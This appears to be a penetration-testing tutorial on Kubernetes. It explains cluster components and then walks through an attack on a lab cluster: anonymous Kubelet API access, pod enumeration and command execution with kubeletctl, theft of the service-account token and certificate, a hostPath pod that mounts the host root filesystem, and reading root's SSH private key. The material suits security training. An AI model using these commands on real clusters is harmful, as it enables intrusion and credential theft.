also known as `K8s`, This platform has completely transformed the process of deploying and managing applications, providing a more efficient and streamlined approach. specifically designed to facilitate faster and more straightforward deployment, scaling, and management of application containers.

Kubernetes is a container orchestration system, which functions by running all applications in containers isolated from the host system through `multiple layers of protection`.
* This approach ensures that applications are not affected by changes in the host system, such as updates or security patches.

## K8s Concept
Kubernetes revolves around the concept of pods, which can hold one or more closely connected containers.

Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details. Kubernetes simplifies the management of multiple containers by offering tools for load balancing, service discovery, storage orchestration, self-healing, and more.

#### Nodes
The master node hosts the Kubernetes `Control Plane`, which manages and coordinates all activities within the cluster and it also ensures that the cluster's desired state is maintained.

the `Minions` execute the actual applications and they receive instructions from the Control Plane and ensure the desired state is achieved

#### Control Plane

The Control Plane serves as the management layer. It consists of several crucial components, including:

|**Service**|**TCP Ports**|
|---|---|
|`etcd`|`2379`, `2380`|
|`API server`|`6443`|
|`Scheduler`|`10251`|
|`Controller Manager`|`10252`|
|`Kubelet API`|`10250`|
|`Read-Only Kubelet API`|`10255`|
#### Minions

`Minions` (worker nodes) serve as the designated location for running applications.

It's important to note that each node is managed and regulated by the Control Plane

The `Scheduler`, based on the `API server`, understands the state of the cluster and schedules new pods on the nodes accordingly. After deciding which node a pod should run on, the API server updates the `etcd`.

The API server is the entry point for all the administrative commands, either from users via kubectl or from the controllers. This server communicates with etcd to fetch or update the cluster state.

#### K8's Security Measures

Kubernetes security can be divided into several domains:

- Cluster infrastructure security
- Cluster configuration security
- Application security
- Data security
## Kubernetes API
 serves as the main point of contact for all internal and external interactions.

the Kubernetes API plays a crucial role in facilitating seamless communication and control within the Kubernetes cluster.

| **Request** | **Description**                                                |
| ----------- | -------------------------------------------------------------- |
| `GET`       | Retrieves information about a resource or a list of resources. |
| `POST`      | Creates a new resource.                                        |
| `PUT`       | Updates an existing resource.                                  |
| `PATCH`     | Applies partial updates to a resource.                         |
| `DELETE`    | Removes a resource.                                            |
#### Authentication

Kubernetes supports various methods such as client certificates, bearer tokens, an authenticating proxy, or HTTP basic auth, which serve to verify the user's identity. Once the user has been authenticated, Kubernetes enforces authorization decisions using Role-Based Access Control (`RBAC`).

In Kubernetes, the `Kubelet` can be configured to permit `anonymous access`. 
By default, the Kubelet allows anonymous access. Anonymous requests are considered unauthenticated, which implies that any request made to the Kubelet without a valid client certificate will be treated as anonymous. This can be problematic as any process or user that can reach the Kubelet API can make requests and receive responses, potentially exposing sensitive information or leading to unauthorized actions.

#### K8's API Server Interaction

Kubernetes

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k

{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}
```

`System:anonymous` typically represents an unauthenticated user, meaning we haven't provided valid credentials or are trying to access the API server anonymously. In this case, we try to access the root path, which would grant significant control over the Kubernetes cluster if successful. By default, access to the root path is generally restricted to authenticated and authorized users with administrative privileges and the API server denied the request, responding with a `403 Forbidden` status code accordingly.
#### Kubelet API - Extracting Pods

Kubernetes

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .

...SNIP...
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
        "resourceVersion": "491",
        "creationTimestamp": "2023-07-04T10:42:02Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
          "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
          "kubernetes.io/config.source": "api"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2023-07-04T10:42:02Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:spec": {
                "f:containers": {
                  "k:{\"name\":\"nginx\"}": {
                    ".": {},
                    "f:image": {},
                    "f:imagePullPolicy": {},
                    "f:name": {},
                    "f:ports": {
					...SNIP...
```
We can also use metadata such as `uid` and `resourceVersion` to perform reconnaissance and recognize potential targets for further attacks. Disclosing the last applied configuration can potentially expose sensitive information, such as passwords, secrets, or API tokens, used during the deployment of the pods.

We can further analyze the pods with the following command:

#### Kubeletctl - Extracting Pods

Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods

┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
```

To effectively interact with pods within the Kubernetes environment, it's important to have a clear understanding of the available commands. One approach that can be particularly useful is utilizing the `scan rce` command in `kubeletctl`. This command provides valuable insights and allows for efficient management of pods.

#### Kubelet API - Available Commands

Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce

┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
```

It is also possible for us to engage with a container interactively and gain insight into the extent of our privileges within it. This allows us to better understand our level of access and control over the container's contents.

#### Kubelet API - Executing Commands

Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```

The output of the command shows that the current user executing the `id` command inside the container has root privileges. This indicates that we have gained administrative access within the container, which could potentially lead to privilege escalation vulnerabilities. If we gain access to a container with root privileges, we can perform further actions on the host system or other containers.

## Privilege Escalation

To gain higher privileges and access the host system, we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.

#### Kubelet API - Extracting Tokens

Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

#### Kubelet API - Extracting Certificates

Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----
```

Now that we have both the `token` and `certificate`, we can check the access rights in the Kubernetes cluster. This is commonly used for auditing and verification to guarantee that users have the correct level of access and are not given more privileges than they need. However, we can use it for our purposes and we can inquire of K8s whether we have permission to perform different actions on various resources.

#### List Privileges

Kubernetes

```shell-session
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											[]					[]				[get create list]
...SNIP...
```

Here we can see a few very important information. Besides the selfsubject-resources we can `get`, `create`, and `list` pods which are the resources representing the running container in the cluster. From here on, we can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory. From there on, we could access the host systems files and directories. The `YAML` file could look like following:

#### Pod YAML

Code: yaml

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Once created, we can now create the new pod and check if it is running as expected.

#### Creating a new Pod

Kubernetes

```shell-session
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.

#### Extracting Root's SSH Key

Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
```
